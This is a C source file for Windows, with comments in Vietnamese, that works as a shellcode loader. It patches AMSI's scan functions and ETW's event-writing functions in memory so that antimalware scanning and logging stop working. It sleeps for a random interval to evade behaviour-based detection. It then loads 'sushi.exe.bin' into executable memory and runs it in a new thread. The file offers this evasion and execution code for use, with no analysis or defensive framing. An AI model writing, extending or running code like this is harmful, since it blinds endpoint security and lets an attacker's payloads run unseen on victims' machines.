#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

// === AMSI PATCH ===
void patch_amsi() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi == NULL) return;
    
    // Patch AmsiScanBuffer trả về S_OK (0x00000000)
    BYTE patch[] = { 0x31, 0xC0, 0xC3 };  // xor eax,eax; ret (x86/x64 đều được)
    
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (pAmsiScanBuffer) {
        DWORD old;
        VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
        memcpy(pAmsiScanBuffer, patch, sizeof(patch));
        VirtualProtect(pAmsiScanBuffer, sizeof(patch), old, &old);
    }
    
    // Patch luôn AmsiScanString
    FARPROC pAmsiScanString = GetProcAddress(hAmsi, "AmsiScanString");
    if (pAmsiScanString) {
        DWORD old;
        VirtualProtect(pAmsiScanString, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
        memcpy(pAmsiScanString, patch, sizeof(patch));
        VirtualProtect(pAmsiScanString, sizeof(patch), old, &old);
    }
}

// === ETW PATCH ===
void patch_etw() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) return;
    
    // Patch EtwEventWrite trả về 0 (thành công)
    BYTE patch[] = { 0x48, 0x33, 0xC0, 0xC3 };  // xor rax,rax; ret (x64)
    
    // Kiểm tra architecture
    BOOL is64bit = FALSE;
    #ifdef _WIN64
    is64bit = TRUE;
    #endif
    
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (pEtwEventWrite) {
        DWORD old;
        VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
        memcpy(pEtwEventWrite, patch, sizeof(patch));
        VirtualProtect(pEtwEventWrite, sizeof(patch), old, &old);
    }
    
    // Patch EtwEventWriteFull
    FARPROC pEtwEventWriteFull = GetProcAddress(hNtdll, "EtwEventWriteFull");
    if (pEtwEventWriteFull) {
        DWORD old;
        VirtualProtect(pEtwEventWriteFull, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
        memcpy(pEtwEventWriteFull, patch, sizeof(patch));
        VirtualProtect(pEtwEventWriteFull, sizeof(patch), old, &old);
    }
}

int main() {
    // === BƯỚC 1: Patch AMSI trước tiên ===
    patch_amsi();
    
    // === BƯỚC 2: Patch ETW ===
    patch_etw();
    
    // === BƯỚC 3: Sleep jitter để tránh behavior chain ===
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());
    Sleep(3000 + (rand() % 3000));  // 3-6 giây
    
    // === BƯỚC 4: Code gốc của bạn (giữ nguyên) ===
    const char *filename = "sushi.exe.bin";
    FILE *file = fopen(filename, "rb");
    if (file == NULL) {
        perror("Failed to open file");
        return 1;
    }
    
    fseek(file, 0, SEEK_END);
    long filesize = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    // Dùng VirtualAlloc với PAGE_READWRITE trước
    unsigned char *buffer = (unsigned char *)VirtualAlloc(NULL, filesize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (buffer == NULL) {
        printf("Memory allocation failed.\n");
        fclose(file);
        return 1;
    }
    
    fread(buffer, 1, filesize, file);
    fclose(file);
    
    // === BƯỚC 5: Thay đổi permission sau khi copy (quan trọng) ===
    DWORD old_protect;
    VirtualProtect(buffer, filesize, PAGE_EXECUTE_READ, &old_protect);
    
    printf("Executing shellcode from %s...\n", filename);
    
    // === BƯỚC 6: Execute ===
    // Dùng thread thay vì gọi trực tiếp
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
    }
    
    // Giữ process sống một chút cho shellcode chạy
    Sleep(5000);
    
    VirtualFree(buffer, 0, MEM_RELEASE);
    return 0;
}
